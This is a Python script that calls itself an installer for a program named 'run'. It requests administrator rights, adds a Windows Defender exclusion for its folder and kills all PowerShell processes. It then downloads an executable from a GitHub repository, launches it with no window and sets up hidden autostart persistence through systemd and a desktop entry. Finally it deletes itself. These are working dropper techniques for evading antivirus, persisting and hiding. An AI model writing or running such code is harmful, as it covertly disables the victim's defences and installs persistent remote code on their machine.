import os
import sys
import time
import subprocess
import urllib.request
import json

IS_WINDOWS = sys.platform == "win32"


def is_admin():
    if IS_WINDOWS:
        try:
            import ctypes

            res = ctypes.windll.shell32.IsUserAnAdmin() != 0
            print(f"Admin check: {res}")
            return res
        except Exception as e:
            print(f"Admin check failed: {e}")
            return False
    else:
        return os.geteuid() == 0


def elevate_if_needed():
    if not IS_WINDOWS:
        # On Linux, installing per-user to ~/.local/share/run with user systemd service is preferred
        return

    import ctypes

    appdata = os.getenv("APPDATA") or os.path.expanduser("~\\AppData\\Roaming")
    dat_dir = os.path.join(appdata, "Microsoft", "run")
    dat_file = os.path.join(dat_dir, "run.dat")
    is_update = os.path.exists(dat_file)
    print(f"Checking elevation... update={is_update}, admin={is_admin()}")

    if not is_update and not is_admin():
        print("Requesting elevation...")
        script = os.path.abspath(sys.argv[0])
        params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
        ctypes.windll.shell32.ShellExecuteW(
            None,
            "runas",
            sys.executable,
            f'"{script}" {params}' if not getattr(sys, "frozen", False) else params,
            None,
            1,
        )
        sys.exit(0)


def main():
    print("Starting installer")
    elevate_if_needed()

    if IS_WINDOWS:
        appdata = os.getenv("APPDATA") or os.path.expanduser("~\\AppData\\Roaming")
        run_dir = os.path.join(appdata, "run")
        run_bin = os.path.join(run_dir, "run.exe")
        dat_dir = os.path.join(appdata, "Microsoft", "run")
        dat_file = os.path.join(dat_dir, "run.dat")
        bin_name = "run.exe"
    else:
        xdg_data = os.getenv("XDG_DATA_HOME") or os.path.expanduser("~/.local/share")
        run_dir = os.path.join(xdg_data, "run")
        run_bin = os.path.join(run_dir, "run")
        dat_dir = run_dir
        dat_file = os.path.join(dat_dir, "run.dat")
        bin_name = "run"

    os.makedirs(run_dir, exist_ok=True)
    os.makedirs(dat_dir, exist_ok=True)

    is_update = os.path.exists(dat_file)

    # Add Defender exclusion on Windows
    if IS_WINDOWS:
        if not is_update:
            print("Adding Defender exclusion...")
            subprocess.run(
                [
                    "powershell.exe",
                    "-Command",
                    f"Add-MpPreference -ExclusionPath '{run_dir}'",
                ],
                creationflags=subprocess.CREATE_NO_WINDOW,
            )
        else:
            print("Update detected, skipping Defender exclusion.")

    # Stop existing processes
    print("Stopping existing processes...")
    if IS_WINDOWS:
        subprocess.run(
            ["taskkill", "/F", "/IM", "run.exe"],
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        subprocess.run(
            ["taskkill", "/F", "/IM", "powershell.exe"],
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
    else:
        subprocess.run(
            ["systemctl", "--user", "stop", "run.service"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        subprocess.run(
            ["pkill", "-f", run_bin],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    time.sleep(2)

    # Fetch latest commit
    print("Fetching latest commit...")
    latest_commit = "main"
    try:
        req = urllib.request.Request(
            "https://api.github.com/repos/yuan-miranda/run/commits/main",
            headers={"User-Agent": "Mozilla/5.0"},
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            latest_commit = data.get("sha", "main")
            print(f"Commit SHA: {latest_commit}")
    except Exception as e:
        print(f"Commit fetch failed: {e}")

    # Download binary
    download_url = f"https://github.com/yuan-miranda/run/raw/{latest_commit}/{bin_name}"
    print(f"Downloading {bin_name}...")
    try:
        urllib.request.urlretrieve(download_url, run_bin)
        if not IS_WINDOWS:
            os.chmod(run_bin, 0o755)
        print("Download completed.")
    except Exception as e:
        print(f"Download failed: {e}")
        sys.exit(1)

    # Save state
    try:
        with open(dat_file, "w", encoding="utf-8") as f:
            f.write(latest_commit)
        print("Saved state.")
    except Exception as e:
        print(f"Failed saving state: {e}")

    # Setup Linux systemd user service & autostart
    if not IS_WINDOWS:
        service_dir = os.path.expanduser("~/.config/systemd/user")
        os.makedirs(service_dir, exist_ok=True)
        service_file = os.path.join(service_dir, "run.service")
        service_content = f"""[Unit]
Description=Run Client Service
After=network.target

[Service]
Type=simple
ExecStart={run_bin}
Restart=always
RestartSec=5

[Install]
WantedBy=default.target
"""
        try:
            with open(service_file, "w", encoding="utf-8") as f:
                f.write(service_content)
            subprocess.run(["systemctl", "--user", "daemon-reload"], check=False)
            subprocess.run(
                ["systemctl", "--user", "enable", "run.service"], check=False
            )
            print("Configured systemd user service.")
        except Exception as e:
            print(f"Systemd service setup note: {e}")

        autostart_dir = os.path.expanduser("~/.config/autostart")
        os.makedirs(autostart_dir, exist_ok=True)
        desktop_file = os.path.join(autostart_dir, "run.desktop")
        desktop_content = f"""[Desktop Entry]
Type=Application
Name=Run
Exec={run_bin}
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
"""
        try:
            with open(desktop_file, "w", encoding="utf-8") as f:
                f.write(desktop_content)
            print("Configured autostart desktop entry.")
        except Exception as e:
            print(f"Autostart desktop setup note: {e}")

    # Launch executable
    print(f"Launching {bin_name}...")
    if IS_WINDOWS:
        subprocess.Popen(
            [run_bin], cwd=run_dir, creationflags=subprocess.CREATE_NO_WINDOW
        )
    else:
        started = False
        try:
            res = subprocess.run(["systemctl", "--user", "start", "run.service"])
            if res.returncode == 0:
                started = True
        except Exception:
            pass
        if not started:
            subprocess.Popen(
                [run_bin],
                cwd=run_dir,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True,
            )

    time.sleep(2)

    # Self delete
    self_path = os.path.abspath(sys.argv[0])
    print("Self-deleting...")
    if os.path.exists(self_path) and self_path.lower() != run_bin.lower():
        if IS_WINDOWS:
            subprocess.Popen(
                f'cmd.exe /c timeout /t 2 >nul & del /f /q "{self_path}"',
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
            )
        else:
            try:
                os.remove(self_path)
            except Exception:
                pass

    print("Done.")


if __name__ == "__main__":
    main()
